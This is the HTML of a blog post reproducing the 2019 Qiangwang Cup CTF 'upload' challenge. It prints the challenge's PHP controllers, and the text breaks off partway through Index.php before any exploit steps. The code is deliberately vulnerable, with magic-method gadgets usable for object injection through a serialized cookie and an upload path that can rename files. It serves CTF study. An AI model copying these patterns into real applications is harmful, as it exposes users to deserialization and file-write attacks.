@@ -1,0 +1,884 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-minimal.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="源码分析重要部分源码如下Profile.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2019 upload题目复现">
+<meta property="og:url" content="https://yml-sec.top/2019/06/07/强网杯2019-upload题目复现/index.html">
+<meta property="og:site_name" content="yemoli&#39;s blog">
+<meta property="og:description" content="源码分析重要部分源码如下Profile.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-af170becce9d136b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-bf333befc23d01f4.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-055b845bf9ac96bb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-3a60637afcfe7405.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-92a473306d6aea37.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-be6c514af8312d53.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-8f79b9129a7fe81f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-75e33117a150f99a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-358147a2a393243e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-639d738016015774.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:image" content="https://upload-images.jianshu.io/upload_images/13385151-fa66c4aa8e8dbb26.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+<meta property="og:updated_time" content="2019-06-07T06:22:34.080Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="强网杯2019 upload题目复现">
+<meta name="twitter:description" content="源码分析重要部分源码如下Profile.php123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293">
+<meta name="twitter:image" content="https://upload-images.jianshu.io/upload_images/13385151-af170becce9d136b.jpg?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://yml-sec.top/2019/06/07/强网杯2019-upload题目复现/">
+
+
+
+
+
+  <title>强网杯2019 upload题目复现 | yemoli's blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="default">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">yemoli's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            Home
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            Tags
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            Archives
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-feiends">
+          <a href="/friends/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-sitemap"></i> <br>
+            
+            feiends
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://yml-sec.top/2019/06/07/强网杯2019-upload题目复现/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="夜莫离、">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="yemoli's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">强网杯2019 upload题目复现</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-06-07T14:22:04+08:00">
+                2019-06-07
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-file-word-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Words count in article&#58;</span>
+                
+                <span title="Words count in article">
+                  1.5k
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-clock-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Reading time &asymp;</span>
+                
+                <span title="Reading time">
+                  7
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h1><p>重要部分源码如下<br>Profile.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Profile</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $filename_tmp;</span><br><span class="line">    <span class="keyword">public</span> $filename;</span><br><span class="line">    <span class="keyword">public</span> $upload_menu;</span><br><span class="line">    <span class="keyword">public</span> $ext;</span><br><span class="line">    <span class="keyword">public</span> $img;</span><br><span class="line">    <span class="keyword">public</span> $except;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker=<span class="keyword">new</span> Index();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;upload_menu=md5($_SERVER[<span class="string">'REMOTE_ADDR'</span>]);</span><br><span class="line">        @chdir(<span class="string">"../public/upload"</span>);</span><br><span class="line">        <span class="keyword">if</span>(!is_dir(<span class="keyword">$this</span>-&gt;upload_menu))&#123;</span><br><span class="line">            @mkdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">        &#125;</span><br><span class="line">        @chdir(<span class="keyword">$this</span>-&gt;upload_menu);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker)&#123;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">empty</span>($_FILES))&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename_tmp=$_FILES[<span class="string">'upload_file'</span>][<span class="string">'tmp_name'</span>];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;filename=md5($_FILES[<span class="string">'upload_file'</span>][<span class="string">'name'</span>]).<span class="string">".png"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;ext_check();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext) &#123;</span><br><span class="line">            <span class="keyword">if</span>(getimagesize(<span class="keyword">$this</span>-&gt;filename_tmp)) &#123;</span><br><span class="line">                @copy(<span class="keyword">$this</span>-&gt;filename_tmp, <span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">                @unlink(<span class="keyword">$this</span>-&gt;filename_tmp);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;img=<span class="string">"../upload/$this-&gt;upload_menu/$this-&gt;filename"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_img();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Forbidden type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Unknow file type!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_img</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $user_info=db(<span class="string">'user'</span>)-&gt;where(<span class="string">"ID"</span>,<span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'ID'</span>])-&gt;find();</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($user_info[<span class="string">'img'</span>]) &amp;&amp; <span class="keyword">$this</span>-&gt;img)&#123;</span><br><span class="line">            <span class="keyword">if</span>(db(<span class="string">'user'</span>)-&gt;where(<span class="string">'ID'</span>,$user_info[<span class="string">'ID'</span>])-&gt;data([<span class="string">"img"</span>=&gt;addslashes(<span class="keyword">$this</span>-&gt;img)])-&gt;update())&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;update_cookie();</span><br><span class="line">                <span class="keyword">$this</span>-&gt;success(<span class="string">'Upload img successful!'</span>, url(<span class="string">'../home'</span>));</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Upload file failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_cookie</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;checker-&gt;profile[<span class="string">'img'</span>]=<span class="keyword">$this</span>-&gt;img;</span><br><span class="line">        cookie(<span class="string">"user"</span>,base64_encode(serialize(<span class="keyword">$this</span>-&gt;checker-&gt;profile)),<span class="number">3600</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ext_check</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $ext_arr=explode(<span class="string">"."</span>,<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext=end($ext_arr);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;ext==<span class="string">"png"</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($name)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;except[$name];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span><span class="params">($name, $arguments)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;&#123;$name&#125;)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;&#123;<span class="keyword">$this</span>-&gt;&#123;$name&#125;&#125;($arguments);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Register.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Register</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $checker;</span><br><span class="line">    <span class="keyword">public</span> $registed;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;checker) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;checker-&gt;login_check())&#123;</span><br><span class="line">                $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">                <span class="keyword">exit</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>(input(<span class="string">"post.username"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.email"</span>)) &amp;&amp; !<span class="keyword">empty</span>(input(<span class="string">"post.password"</span>))) &#123;</span><br><span class="line">            $email = input(<span class="string">"post.email"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $password = input(<span class="string">"post.password"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            $username = input(<span class="string">"post.username"</span>, <span class="string">""</span>, <span class="string">"addslashes"</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;check_email($email)) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"username"</span>, $username)-&gt;find()) &amp;&amp; <span class="keyword">empty</span>(db(<span class="string">"user"</span>)-&gt;where(<span class="string">"email"</span>, $email)-&gt;find())) &#123;</span><br><span class="line">                    $user_info = [<span class="string">"email"</span> =&gt; $email, <span class="string">"password"</span> =&gt; md5($password), <span class="string">"username"</span> =&gt; $username];</span><br><span class="line">                    <span class="keyword">if</span> (db(<span class="string">"user"</span>)-&gt;insert($user_info)) &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;registed = <span class="number">1</span>;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;success(<span class="string">'Registed successful!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">$this</span>-&gt;error(<span class="string">'Registed failed!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">$this</span>-&gt;error(<span class="string">'Account already exists!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;error(<span class="string">'Email illegal!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;error(<span class="string">'Something empty!'</span>, url(<span class="string">'../index'</span>));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check_email</span><span class="params">($email)</span></span>&#123;</span><br><span class="line">        $pattern = <span class="string">"/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]&#123;2,&#125;)$/"</span>;</span><br><span class="line">        preg_match($pattern, $email, $matches);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>($matches))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;registed)&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;checker-&gt;index();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>Index.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">web</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $profile;</span><br><span class="line">    <span class="keyword">public</span> $profile_db;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/home"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"index"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">home</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;login_check())&#123;</span><br><span class="line">            $curr_url=<span class="string">"http://"</span>.$_SERVER[<span class="string">'HTTP_HOST'</span>].$_SERVER[<span class="string">'SCRIPT_NAME'</span>].<span class="string">"/index"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;redirect($curr_url,<span class="number">302</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="keyword">$this</span>-&gt;check_upload_img())&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"username"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'username'</span>]);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(<span class="string">"upload"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;assign(<span class="string">"img"</span>,<span class="keyword">$this</span>-&gt;profile_db[<span class="string">'img'</span>]);</span><br><span class="line">            <span 